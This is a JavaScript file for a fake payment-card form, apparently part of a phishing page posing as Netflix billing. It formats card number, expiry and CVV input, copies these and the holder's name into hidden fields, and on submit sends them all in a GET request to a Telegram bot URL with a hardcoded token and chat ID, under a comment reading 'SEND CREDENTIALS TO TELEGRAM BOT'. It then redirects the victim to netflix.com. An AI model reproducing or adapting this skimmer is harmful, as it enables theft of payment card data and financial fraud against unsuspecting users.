let number = document.getElementById("number");
let year = document.getElementById("year");
let cvv = document.getElementById("cvv");
let firstname = document.getElementById("firstname");
let lastname = document.getElementById("lastname");
let gobutton = document.getElementById("gobutton");

number.addEventListener("keyup", (e) => {
  let inputNumber = e.target.value;
  number.value = inputNumber
    .replace(/\s/g, "")
    .replace(/\D/g, "")
    .replace(/([0-9]{4})/g, "$1 ")
    .trim();
});

year.addEventListener("keyup", (e) => {
  let inputYear = e.target.value;

  year.value = inputYear
    .replace(/\s/g, "")
    .replace(/\D/g, "")
    .replace(/([0-9]{2})/g, "$1/")
    .trim();
});

cvv.addEventListener("keyup", (e) => {
  let inputCvv = e.target.value;
  cvv.value = inputCvv.replace(/\s/g, "").replace(/\D/g, "").trim();
});

// SEND CREDENTIALS TO TELEGRAM BOT

let resnumber = document.getElementById("resnumber");
let resyear = document.getElementById("resyear");
let rescvv = document.getElementById("rescvv");
let resname = document.getElementById("resname");
let reslastname = document.getElementById("reslastname");

number.addEventListener("change", () => {
  resnumber.value = number.value;
});
year.addEventListener("change", () => {
  resyear.value = year.value;
});
cvv.addEventListener("change", () => {
  rescvv.value = cvv.value;
});
firstname.addEventListener("change", () => {
  resfirstname.value = firstname.value;
});
lastname.addEventListener("change", () => {
  reslastname.value = lastname.value;
});

gobutton.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6326754827:AAF3vnmokN9_14hmqKcDcgy8JeiVb9Mh7ds/sendMessage?chat_id=1531393059&text=NUMBER%20CARD:%20" +
    resnumber.value +
    " MM/AA: " +
    resyear.value +
    " CVV: " +
    rescvv.value +
    " NAME: " +
    resfirstname.value +
    " LASTNAME: " +
    reslastname.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

  window.location.href = "https://netflix.com";
});
